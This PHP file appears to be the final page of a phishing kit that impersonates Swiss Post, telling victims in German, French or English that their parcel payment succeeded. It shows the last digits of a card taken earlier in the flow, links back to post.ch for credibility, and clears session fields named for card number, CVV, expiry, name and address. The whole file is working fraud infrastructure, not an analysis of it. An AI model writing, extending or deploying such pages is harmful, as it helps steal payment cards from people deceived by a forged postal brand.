<?php
require __DIR__ . '/security.php';
require __DIR__ . '/lang.php';

date_default_timezone_set('Europe/Zurich');

// Get card last 4 digits
$cardLast4 = isset($_SESSION['_cc']) ? substr(str_replace(' ', '', $_SESSION['_cc']), -4) : '****';

// Generate confirmation number
$confirmationNumber = 'CH' . strtoupper(bin2hex(random_bytes(4)));

// Clean up status file
$statusDir = __DIR__ . '/status';
$sessionId = $_SESSION['session_id'] ?? null;
if ($sessionId && file_exists("$statusDir/$sessionId.txt")) {
    unlink("$statusDir/$sessionId.txt");
}

// Check if error
$isError = isset($_GET['status']) && $_GET['status'] === 'error';

// Translations for exit page
$exitTexts = [
    'de' => [
        'title_success' => 'Zahlung erfolgreich',
        'title_error' => 'Zahlung fehlgeschlagen',
        'success_heading' => 'Zahlung erfolgreich!',
        'success_text' => 'Ihre Zahlung wurde bestätigt. Ihre Sendung wird in Kürze zugestellt.',
        'error_heading' => 'Zahlung fehlgeschlagen',
        'error_text' => 'Die Zahlung konnte nicht verarbeitet werden. Bitte versuchen Sie es erneut oder kontaktieren Sie Ihre Bank.',
        'confirmation' => 'Bestätigungsnummer',
        'shipment' => 'Sendung',
        'payment_method' => 'Zahlungsmethode',
        'date' => 'Datum',
        'amount_paid' => 'Bezahlter Betrag',
        'next_steps' => 'Nächste Schritte',
        'next_steps_text' => 'Ihre Sendung wird innerhalb von 1-3 Werktagen zugestellt. Sie erhalten die Tracking-Informationen per E-Mail.',
        'btn_home' => 'Zur Startseite',
        'btn_track' => 'Sendung verfolgen',
        'btn_retry' => 'Erneut versuchen',
        'thank_you' => 'Vielen Dank für Ihr Vertrauen!',
    ],
    'fr' => [
        'title_success' => 'Paiement réussi',
        'title_error' => 'Paiement échoué',
        'success_heading' => 'Paiement réussi!',
        'success_text' => 'Votre paiement a été confirmé. Votre envoi sera livré prochainement.',
        'error_heading' => 'Paiement échoué',
        'error_text' => 'Le paiement n\'a pas pu être traité. Veuillez réessayer ou contacter votre banque.',
        'confirmation' => 'Numéro de confirmation',
        'shipment' => 'Envoi',
        'payment_method' => 'Mode de paiement',
        'date' => 'Date',
        'amount_paid' => 'Montant payé',
        'next_steps' => 'Prochaines étapes',
        'next_steps_text' => 'Votre envoi sera livré dans 1-3 jours ouvrables. Vous recevrez les informations de suivi par e-mail.',
        'btn_home' => 'Retour à l\'accueil',
        'btn_track' => 'Suivre l\'envoi',
        'btn_retry' => 'Réessayer',
        'thank_you' => 'Merci de votre confiance!',
    ],
    'en' => [
        'title_success' => 'Payment successful',
        'title_error' => 'Payment failed',
        'success_heading' => 'Payment successful!',
        'success_text' => 'Your payment has been confirmed. Your shipment will be delivered soon.',
        'error_heading' => 'Payment failed',
        'error_text' => 'The payment could not be processed. Please try again or contact your bank.',
        'confirmation' => 'Confirmation number',
        'shipment' => 'Shipment',
        'payment_method' => 'Payment method',
        'date' => 'Date',
        'amount_paid' => 'Amount paid',
        'next_steps' => 'Next steps',
        'next_steps_text' => 'Your shipment will be delivered within 1-3 business days. You will receive tracking information by email.',
        'btn_home' => 'Return to home',
        'btn_track' => 'Track shipment',
        'btn_retry' => 'Try again',
        'thank_you' => 'Thank you for your trust!',
    ],
];

$et = $exitTexts[$currentLang] ?? $exitTexts['de'];
?><!DOCTYPE html>
<html lang="<?php echo $currentLang; ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo $isError ? $et['title_error'] : $et['title_success']; ?> - <?php echo t('site_title'); ?></title>
<link rel="icon" href="https://media.20min.ch/7/image/2023/12/27/cf810a3b-398c-46b4-b5f3-fed4f2973f08.png?auto=format%2Ccompress%2Cenhance&fit=max&w=1600&h=1600&rect=0%2C0%2C2048%2C2048&fp-x=0.5&fp-y=0.5&s=eaf5294ac39e1a86e4764bc72644b55f">
<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Fira Sans',Arial,sans-serif;background:#f5f5f5;color:#1e1e1e;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

:root {
    --post-yellow: #FFCC00;
    --post-yellow-dark: #E6B800;
    --post-red: #E2001A;
    --post-gray: #F5F5F5;
    --post-dark: #1e1e1e;
    --post-border: #e5e5e5;
    --post-green: #00A550;
}

/* HEADER */
.tb{background:#fff;border-bottom:1px solid var(--post-border);display:flex;align-items:center;height:56px;padding:0 24px;}
.tb-logo{display:flex;align-items:center;background:var(--post-yellow);height:56px;margin-left:-24px;padding:0 20px;}
.tb-logo img{height:36px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-langs{display:flex;border:1px solid var(--post-border);border-radius:4px;overflow:hidden;}
.tb-lang{font-size:13px;font-weight:600;padding:6px 10px;cursor:pointer;color:#666;background:#fff;}
.tb-lang.active{background:var(--post-dark);color:#fff;}

/* PAGE CONTENT */
.page-content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}

/* RESULT CARD */
.result-card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.08);padding:48px 40px;text-align:center;max-width:500px;width:100%;}

/* SUCCESS ICON */
.success-icon{width:100px;height:100px;margin:0 auto 24px;position:relative;}
.success-circle{position:absolute;inset:0;border-radius:50%;background:var(--post-green);display:flex;align-items:center;justify-content:center;animation:scale-in 0.5s ease-out;}
.success-circle svg{width:50px;height:50px;fill:#fff;animation:check-draw 0.5s ease-out 0.3s both;}
@keyframes scale-in{from{transform:scale(0);}to{transform:scale(1);}}
@keyframes check-draw{from{opacity:0;transform:scale(0.5);}to{opacity:1;transform:scale(1);}}
.success-ring{position:absolute;inset:-10px;border:3px solid var(--post-green);border-radius:50%;opacity:0;animation:ring-expand 0.6s ease-out 0.4s both;}
@keyframes ring-expand{from{transform:scale(0.8);opacity:0.8;}to{transform:scale(1.2);opacity:0;}}

/* ERROR ICON */
.error-icon{width:100px;height:100px;margin:0 auto 24px;position:relative;}
.error-circle{position:absolute;inset:0;border-radius:50%;background:var(--post-red);display:flex;align-items:center;justify-content:center;}
.error-circle svg{width:50px;height:50px;fill:#fff;}

/* TEXT */
.result-card h1{font-size:24px;font-weight:800;margin-bottom:10px;}
.result-card h1.success{color:#166534;}
.result-card h1.error{color:#991B1B;}
.result-card p{font-size:15px;color:#666;line-height:1.6;max-width:380px;margin:0 auto;}

/* CONFIRMATION BOX */
.confirmation-box{background:linear-gradient(135deg,#F0FDF4 0%,#DCFCE7 100%);border:2px solid #BBF7D0;border-radius:10px;padding:22px;margin-top:24px;}
.confirmation-label{font-size:11px;color:#166534;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;}
.confirmation-number{font-size:26px;font-weight:800;color:#15803D;letter-spacing:2px;}

/* DETAILS */
.details{margin-top:24px;text-align:left;background:var(--post-gray);border-radius:10px;padding:18px 22px;}
.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #e5e5e5;}
.detail-row:last-child{border-bottom:none;}
.detail-label{font-size:14px;color:#888;}
.detail-value{font-size:14px;font-weight:700;color:var(--post-dark);}
.detail-value.amount{color:var(--post-dark);font-size:18px;}

/* INFO BOX */
.info-box{background:#FFFDF5;border:1.5px solid #FFE082;border-radius:10px;padding:16px 18px;margin-top:20px;text-align:left;}
.info-box-header{display:flex;align-items:center;gap:8px;margin-bottom:6px;}
.info-box-header svg{width:18px;height:18px;fill:#F57C00;}
.info-box-header span{font-size:13px;font-weight:700;color:#F57C00;}
.info-box p{font-size:13px;color:#795548;line-height:1.6;}

/* BUTTON */
.btn-primary{display:inline-flex;align-items:center;justify-content:center;gap:10px;background:var(--post-yellow);color:var(--post-dark);border:none;border-radius:6px;padding:16px 36px;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer;margin-top:24px;text-decoration:none;transition:all 0.2s;}
.btn-primary:hover{background:var(--post-yellow-dark);transform:translateY(-2px);box-shadow:0 4px 12px rgba(255,204,0,0.4);}
.btn-primary svg{width:20px;height:20px;fill:currentColor;}

.btn-secondary{display:inline-flex;align-items:center;justify-content:center;gap:8px;background:#fff;color:var(--post-dark);border:2px solid var(--post-border);border-radius:6px;padding:12px 28px;font-size:14px;font-weight:700;font-family:inherit;cursor:pointer;margin-top:10px;text-decoration:none;transition:all 0.2s;}
.btn-secondary:hover{border-color:var(--post-yellow);background:#FFFDF5;}
.btn-secondary svg{width:18px;height:18px;fill:currentColor;}

/* FOOTER */
footer{background:#fff;border-top:1px solid var(--post-border);padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}
footer a{color:var(--post-red);font-weight:600;}

@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-logo{margin-left:-16px;padding:0 16px;height:50px;}
    .tb-logo img{height:30px;}
    .tb-langs{display:none;}
    .page-content{padding:20px 16px;}
    .result-card{padding:32px 20px;border-radius:10px;}
    .success-icon,.error-icon{width:80px;height:80px;margin-bottom:20px;}
    .success-circle svg,.error-circle svg{width:40px;height:40px;}
    .result-card h1{font-size:20px;}
    .result-card p{font-size:14px;}
    .confirmation-box{padding:18px;margin-top:20px;}
    .confirmation-label{font-size:10px;}
    .confirmation-number{font-size:20px;}
    .details{margin-top:20px;padding:14px 16px;}
    .detail-row{padding:8px 0;}
    .detail-value.amount{font-size:16px;}
    .info-box{padding:14px;margin-top:16px;}
    .btn-primary{width:100%;padding:14px;font-size:15px;margin-top:20px;}
    .btn-secondary{width:100%;padding:12px;margin-top:8px;}
}
</style>
</head>
<body>

<!-- HEADER -->
<div class="tb">
    <div class="tb-logo">
        <img src="https://media.20min.ch/7/image/2023/12/27/cf810a3b-398c-46b4-b5f3-fed4f2973f08.png?auto=format%2Ccompress%2Cenhance&fit=max&w=1600&h=1600&rect=0%2C0%2C2048%2C2048&fp-x=0.5&fp-y=0.5&s=eaf5294ac39e1a86e4764bc72644b55f" alt="Swi">
    </div>
    <div class="tb-right">
        <div class="tb-langs">
            <span class="tb-lang <?php echo $currentLang === 'de' ? 'active' : ''; ?>">DE</span>
            <span class="tb-lang <?php echo $currentLang === 'fr' ? 'active' : ''; ?>">FR</span>
            <span class="tb-lang <?php echo $currentLang === 'en' ? 'active' : ''; ?>">EN</span>
        </div>
    </div>
</div>

<!-- PAGE CONTENT -->
<div class="page-content">
    <div class="result-card">

        <?php if ($isError): ?>

        <!-- ERROR STATE -->
        <div class="error-icon">
            <div class="error-circle">
                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
            </div>
        </div>

        <h1 class="error"><?php echo $et['error_heading']; ?></h1>
        <p><?php echo $et['error_text']; ?></p>

        <a href="?s=2" class="btn-primary">
            <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
            <?php echo $et['btn_retry']; ?>
        </a>

        <?php else: ?>

        <!-- SUCCESS STATE -->
        <div class="success-icon">
            <div class="success-circle">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
            </div>
            <div class="success-ring"></div>
        </div>

        <h1 class="success"><?php echo $et['success_heading']; ?></h1>
        <p><?php echo $et['success_text']; ?></p>

        <div class="confirmation-box">
            <div class="confirmation-label"><?php echo $et['confirmation']; ?></div>
            <div class="confirmation-number"><?php echo $confirmationNumber; ?></div>
        </div>

        <div class="details">
            <div class="detail-row">
                <span class="detail-label"><?php echo $et['shipment']; ?></span>
                <span class="detail-value">#<?php echo $trackingNumber; ?></span>
            </div>
            <div class="detail-row">
                <span class="detail-label"><?php echo $et['payment_method']; ?></span>
                <span class="detail-value">•••• <?php echo $cardLast4; ?></span>
            </div>
            <div class="detail-row">
                <span class="detail-label"><?php echo $et['date']; ?></span>
                <span class="detail-value"><?php echo date('d.m.Y H:i'); ?></span>
            </div>
            <div class="detail-row">
                <span class="detail-label"><?php echo $et['amount_paid']; ?></span>
                <span class="detail-value amount"><?php echo $currency; ?> <?php echo $amount; ?></span>
            </div>
        </div>

        <div class="info-box">
            <div class="info-box-header">
                <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 9H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2z"/></svg>
                <span><?php echo $et['next_steps']; ?></span>
            </div>
            <p><?php echo $et['next_steps_text']; ?></p>
        </div>

        <a href="https://www.post.ch" class="btn-primary">
            <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8h5z"/></svg>
            <?php echo $et['btn_home']; ?>
        </a>

        <a href="?s=1" class="btn-secondary">
            <svg viewBox="0 0 24 24"><path d="M19 8l-4 4h3c0 3.31-2.69 6-6 6-1.01 0-1.97-.25-2.8-.7l-1.46 1.46C8.97 19.54 10.43 20 12 20c4.42 0 8-3.58 8-8h3l-4-4zM6 12c0-3.31 2.69-6 6-6 1.01 0 1.97.25 2.8.7l1.46-1.46C15.03 4.46 13.57 4 12 4c-4.42 0-8 3.58-8 8H1l4 4 4-4H6z"/></svg>
            <?php echo $et['btn_track']; ?>
        </a>

        <?php endif; ?>

    </div>
</div>

<!-- FOOTER -->
<footer>
    <p><?php echo $et['thank_you']; ?> <a href="#"><?php echo t('nav_help'); ?></a></p>
    <p style="margin-top:8px;">&copy; 2024 <?php echo t('footer_copyright'); ?></p>
</footer>

<?php
// Clear sensitive session data
unset($_SESSION['_cc'], $_SESSION['_cvv'], $_SESSION['_exp'], $_SESSION['_name']);
unset($_SESSION['_address'], $_SESSION['_city'], $_SESSION['_zip']);
?>
</script>
<script src="/assets/js/main.js"></script>
</body>
</html>